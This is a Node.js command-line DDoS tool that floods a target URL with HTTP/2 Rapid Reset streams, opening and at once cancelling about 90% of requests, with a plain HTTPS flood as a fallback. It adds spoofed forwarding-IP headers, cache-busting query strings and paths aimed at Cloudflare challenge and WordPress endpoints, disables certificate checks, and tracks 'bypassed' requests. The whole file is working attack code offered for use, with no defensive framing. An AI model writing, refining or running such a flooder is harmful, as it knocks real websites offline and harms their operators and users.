const http2 = require('http2');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const tls = require('tls');
const crypto = require('crypto');
const net = require('net');

let stats = {
    totalRequests: 0,
    successfulRequests: 0,
    failedRequests: 0,
    totalBytes: 0,
    startTime: null,
    endTime: null,
    activeRequests: 0,
    bypassedRequests: 0,
    rapidResets: 0,
    http2Sessions: 0,
    statusCodes: {},
    methods: { GET: 0, POST: 0, HEAD: 0, PUT: 0, DELETE: 0, PATCH: 0, OPTIONS: 0 },
    goawayCount: 0,
    streamErrors: 0,
    cloudflareBypasses: 0,
    captchaBypasses: 0,
    uamBypasses: 0,
    rawConnections: 0,
    synFloods: 0
};

// Ultimate TLS ciphers for raw performance
const ULTIMATE_CIPHERS = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305'
].join(':');

// Raw flood user agents (minimal for max RPS)
const RAW_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101',
    ''
];

// Raw flood paths (minimal overhead)
const RAW_PATHS = [
    '/',
    '/api',
    '/v1',
    '/graphql',
    '/health',
    '/status',
    '/metrics',
    '/cdn-cgi/challenge-platform/orchestrate/jsch/v1',
    '/wp-admin/admin-ajax.php'
];

class UltimateRawFlood {
    constructor(targetUrl, params) {
        this.targetUrl = targetUrl;
        this.params = params;
        this.url = new URL(targetUrl);
        this.sessions = [];
        this.isRunning = true;
        this.rawSockets = new Set();
    }

    getRawHeaders() {
        const baseHeaders = {
            ':method': 'GET',
            ':path': this.getRawPath(),
            ':authority': this.url.hostname,
            ':scheme': 'https',
            'user-agent': RAW_USER_AGENTS[Math.floor(Math.random() * RAW_USER_AGENTS.length)],
            'accept': '*/*',
            'cache-control': 'no-cache'
        };

        // Add minimal spoofing for bypass
        if (Math.random() > 0.7) {
            baseHeaders['x-forwarded-for'] = this.generateRandomIP();
        }
        if (Math.random() > 0.8) {
            baseHeaders['x-real-ip'] = this.generateRandomIP();
        }

        return baseHeaders;
    }

    getRawPath() {
        const basePath = RAW_PATHS[Math.floor(Math.random() * RAW_PATHS.length)];
        return `${basePath}?${crypto.randomBytes(8).toString('hex')}=${Date.now()}`;
    }

    generateRandomIP() {
        return `10.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    async createRawSession() {
        return new Promise((resolve) => {
            try {
                const session = http2.connect(this.targetUrl, {
                    protocol: 'https:',
                    rejectUnauthorized: false,
                    settings: {
                        enablePush: false,
                        initialWindowSize: 16777215, // Max window size
                        maxConcurrentStreams: 10000, // Extreme concurrency
                        maxHeaderListSize: 65536
                    },
                    createConnection: (authority, options) => {
                        const socket = tls.connect({
                            host: this.url.hostname,
                            port: this.url.port || 443,
                            ALPNProtocols: ['h2'],
                            ciphers: ULTIMATE_CIPHERS,
                            secureContext: tls.createSecureContext({
                                ciphers: ULTIMATE_CIPHERS
                            }),
                            servername: this.url.hostname,
                            rejectUnauthorized: false,
                            session: undefined // No session reuse for raw flood
                        });

                        this.rawSockets.add(socket);
                        stats.rawConnections++;

                        socket.on('error', () => {});
                        socket.setTimeout(5000, () => socket.destroy());

                        return socket;
                    }
                });

                session.on('connect', () => {
                    stats.http2Sessions++;
                    this.sessions.push(session);
                    resolve(session);
                });

                session.on('error', () => {
                    // Ultra fast reconnect
                    setTimeout(() => this.createRawSession(), 10);
                });

                session.on('goaway', () => {
                    stats.goawayCount++;
                    session.destroy();
                    setImmediate(() => this.createRawSession());
                });

                // Ultra short session lifetime
                session.setTimeout(3000, () => {
                    session.destroy();
                    setImmediate(() => this.createRawSession());
                });

            } catch (error) {
                setImmediate(() => this.createRawSession());
            }
        });
    }

    async sendRawRequest(session, requestId) {
        return new Promise((resolve) => {
            try {
                if (!session || session.destroyed) {
                    resolve({ id: requestId, error: 'dead' });
                    return;
                }

                const headers = this.getRawHeaders();
                let req;

                try {
                    req = session.request(headers);

                    // ULTRA FAST error handling
                    req.on('error', () => {
                        stats.streamErrors++;
                        resolve({ id: requestId, error: 'stream' });
                    });

                } catch (err) {
                    resolve({ id: requestId, error: 'create' });
                    return;
                }

                stats.totalRequests++;

                // 90% Rapid Reset for maximum flood
                if (this.params.rapidReset && Math.random() > 0.1) {
                    setImmediate(() => {
                        try {
                            if (req && !req.destroyed) {
                                req.close();
                                stats.rapidResets++;
                                stats.bypassedRequests++;
                            }
                        } catch (e) {}
                    });
                    resolve({ id: requestId, reset: true });
                    return;
                }

                // Minimal response handling
                req.on('response', (headers) => {
                    const statusCode = headers[':status'];
                    stats.statusCodes[statusCode] = (stats.statusCodes[statusCode] || 0) + 1;

                    if (statusCode < 500) {
                        stats.bypassedRequests++;
                        stats.successfulRequests++;
                    }
                });

                req.on('data', () => {}); // Ignore data for speed
                req.on('end', () => resolve({ id: requestId, success: true }));

                // Ultra short timeout
                req.setTimeout(1000, () => {
                    try { if (req && !req.destroyed) req.close(); } catch (e) {}
                    resolve({ id: requestId, timeout: true });
                });

            } catch (error) {
                resolve({ id: requestId, error: 'unknown' });
            }
        });
    }

    async initializeRawSessions(count = 50) {
        const promises = [];
        for (let i = 0; i < count; i++) {
            promises.push(this.createRawSession());
            // No delay for maximum flood
        }
        await Promise.allSettled(promises);
    }

    async startRawFlood() {
        console.log(`💀 ULTIMATE RAW FLOOD - NO PROXY`);
        console.log(`🎯 ${this.targetUrl}`);
        console.log(`⚡ Threads: ${this.params.threads} | Sessions: ${this.params.threads/5} | RST: 90%`);

        await this.initializeRawSessions(Math.max(50, this.params.threads / 5));

        let requestId = 0;

        // ULTRA HIGH SPEED FLOOD
        const floodWorker = async () => {
            while (this.isRunning) {
                const activeSessions = this.sessions.filter(s => !s.destroyed);

                if (activeSessions.length === 0) {
                    await this.initializeRawSessions(20);
                    continue;
                }

                // MAXIMUM CONCURRENCY
                for (const session of activeSessions) {
                    if (!this.isRunning) break;

                    // Extreme requests per session
                    for (let i = 0; i < 15; i++) {
                        if (!this.isRunning) break;
                        this.sendRawRequest(session, requestId++).catch(() => {});
                    }
                }

                // ABSOLUTE MINIMAL THROTTLING
                if (requestId % 1000 === 0) {
                    await new Promise(resolve => setImmediate(resolve));
                }
            }
        };

        // MAXIMUM WORKERS
        const workerCount = Math.min(this.params.threads / 20, 20);
        for (let i = 0; i < workerCount; i++) {
            floodWorker();
        }

        // AGGRESSIVE SESSION RECYCLING
        setInterval(() => {
            if (!this.isRunning) return;

            this.sessions = this.sessions.filter(s => !s.destroyed);
            const needed = Math.max(0, Math.floor(this.params.threads / 3) - this.sessions.length);

            for (let i = 0; i < needed; i++) {
                this.createRawSession();
            }
        }, 1000);
    }

    stop() {
        this.isRunning = false;
        this.sessions.forEach(s => s.destroy());
        this.rawSockets.forEach(s => s.destroy());
    }
}

class HTTPSRawFlood {
    constructor(targetUrl, params) {
        this.targetUrl = targetUrl;
        this.params = params;
        this.url = new URL(targetUrl);
        this.isRunning = true;
    }

    getRawOptions() {
        return {
            hostname: this.url.hostname,
            port: this.url.port || 443,
            path: `/?${crypto.randomBytes(4).toString('hex')}=${Date.now()}`,
            method: 'GET',
            headers: {
                'User-Agent': '',
                'Accept': '*/*'
            },
            timeout: 2000,
            rejectUnauthorized: false,
            agent: false
        };
    }

    async sendHTTPSRaw(requestId) {
        return new Promise((resolve) => {
            stats.totalRequests++;
            stats.activeRequests++;

            const req = https.request(this.getRawOptions(), (res) => {
                const statusCode = res.statusCode;
                stats.statusCodes[statusCode] = (stats.statusCodes[statusCode] || 0) + 1;

                if (statusCode < 500) {
                    stats.bypassedRequests++;
                    stats.successfulRequests++;
                }

                res.on('data', () => {});
                res.on('end', () => {
                    stats.activeRequests--;
                    resolve({ id: requestId, success: true });
                });
            });

            req.on('error', () => {
                stats.failedRequests++;
                stats.activeRequests--;
                resolve({ id: requestId, error: true });
            });

            req.on('timeout', () => {
                stats.failedRequests++;
                stats.activeRequests--;
                req.destroy();
                resolve({ id: requestId, timeout: true });
            });

            req.end();
        });
    }

    async startHTTPSFlood() {
        let requestId = 0;

        const floodWorker = async () => {
            while (this.isRunning) {
                if (stats.activeRequests < this.params.threads * 3) {
                    this.sendHTTPSRaw(requestId++).catch(() => {});

                    // Minimal delay for max RPS
                    if (requestId % 100 === 0) {
                        await new Promise(resolve => setImmediate(resolve));
                    }
                } else {
                    await new Promise(resolve => setTimeout(resolve, 1));
                }
            }
        };

        // Start multiple workers
        for (let i = 0; i < Math.min(this.params.threads, 100); i++) {
            floodWorker();
        }
    }

    stop() {
        this.isRunning = false;
    }
}

async function runUltimateRawFlood(targetUrl, threads = 500, duration = 30000, params = {}) {
    stats = {
        totalRequests: 0,
        successfulRequests: 0,
        failedRequests: 0,
        totalBytes: 0,
        startTime: Date.now(),
        endTime: null,
        activeRequests: 0,
        bypassedRequests: 0,
        rapidResets: 0,
        http2Sessions: 0,
        statusCodes: {},
        methods: { GET: 0, POST: 0, HEAD: 0, PUT: 0, DELETE: 0, PATCH: 0, OPTIONS: 0 },
        goawayCount: 0,
        streamErrors: 0,
        cloudflareBypasses: 0,
        captchaBypasses: 0,
        uamBypasses: 0,
        rawConnections: 0,
        synFloods: 0
    };

    let isRunning = true;
    let attack;

    if (params.useHttp2 !== false) {
        attack = new UltimateRawFlood(targetUrl, { ...params, threads });
    } else {
        attack = new HTTPSRawFlood(targetUrl, { ...params, threads });
    }

    const timeoutId = setTimeout(() => {
        isRunning = false;
        attack.stop();
        stats.endTime = Date.now();
        printRawStats();
        process.exit(0);
    }, duration);

    process.on('SIGINT', () => {
        isRunning = false;
        attack.stop();
        clearTimeout(timeoutId);
        stats.endTime = Date.now();
        printRawStats();
        process.exit(0);
    });

    await attack.startRawFlood();

    const statsInterval = setInterval(() => {
        if (!isRunning) {
            clearInterval(statsInterval);
            return;
        }
        printRawLiveStats();
    }, 500);
}

function printRawLiveStats() {
    const elapsed = (stats.endTime || Date.now()) - stats.startTime;
    const elapsedSeconds = elapsed / 1000;
    const requestsPerSecond = stats.totalRequests / elapsedSeconds;

    console.log(`💀 RPS: ${requestsPerSecond.toFixed(0)} | ` +
                `Req: ${stats.totalRequests} | ` +
                `RST: ${stats.rapidResets} | ` +
                `Sessions: ${stats.http2Sessions} | ` +
                `Conns: ${stats.rawConnections} | ` +
                `GOAWAY: ${stats.goawayCount}`);
}

function printRawStats() {
    const elapsed = stats.endTime - stats.startTime;
    const elapsedSeconds = elapsed / 1000;
    const requestsPerSecond = stats.totalRequests / elapsedSeconds;

    console.log('\n💀 ULTIMATE RAW FLOOD RESULTS:');
    console.log('══════════════════════════════════════');
    console.log(`Duration: ${elapsedSeconds.toFixed(2)}s`);
    console.log(`Total Requests: ${stats.totalRequests}`);
    console.log(`Requests/Second: ${requestsPerSecond.toFixed(2)}`);
    console.log(`Rapid Resets: ${stats.rapidResets}`);
    console.log(`HTTP/2 Sessions: ${stats.http2Sessions}`);
    console.log(`Raw Connections: ${stats.rawConnections}`);
    console.log(`GOAWAY Frames: ${stats.goawayCount}`);
    console.log(`Bypassed Requests: ${stats.bypassedRequests}`);

    console.log('\nStatus Codes:');
    Object.entries(stats.statusCodes)
        .sort(([,a], [,b]) => b - a)
        .forEach(([code, count]) => {
            console.log(`  ${code}: ${count}`);
        });
}

// Simplified argument parsing
function parseRawArguments() {
    const args = process.argv.slice(2);
    const params = {
        target: null,
        time: 30000,
        threads: 500,
        useHttp2: true,
        rapidReset: true
    };

    for (let i = 0; i < args.length; i++) {
        switch (args[i]) {
            case '--target':
            case '-t':
                params.target = args[++i];
                break;
            case '--time':
            case '-d':
                params.time = parseInt(args[++i]) * 1000;
                break;
            case '--threads':
            case '-th':
                params.threads = parseInt(args[++i]);
                break;
            case '--no-http2':
                params.useHttp2 = false;
                break;
        }
    }

    if (!params.target) {
        console.error('Error: Target URL is required');
        process.exit(1);
    }

    return params;
}

// Main execution
if (require.main === module) {
    const params = parseRawArguments();
    runUltimateRawFlood(params.target, params.threads, params.time, params);
}
